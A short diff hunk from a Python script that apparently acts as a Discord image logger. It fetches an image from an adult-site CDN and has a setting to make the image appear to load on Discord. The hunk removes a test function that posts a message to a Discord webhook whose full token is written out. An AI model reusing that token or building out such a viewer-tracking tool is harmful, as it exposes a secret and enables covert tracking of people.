@@ -7,15 +7,7 @@ bindata = requests.get('https://cdn.socialmediapornstars.com/img/650a.jpg').cont
 
 
 
-webhook_url = "https://discord.com/api/webhooks/1067207078768291840/t-UW9b_i2v2504nkJh_8WmE285EUlOgq86g8VTKA8GGuPx-g8c-Ib69tpQX-W55ZLmgK"
-message = "Hello, this is a test message."
-send_message(webhook_url, message)
 
-import requests
-
-def send_message(webhook_url, message):
-    data = { "text": message }
-    requests.post(webhook_url, json=data)
 
 
 buggedimg = True # Set this to True if you want the image to show as loading on Discord, False if you don't. (CASE SENSITIVE)
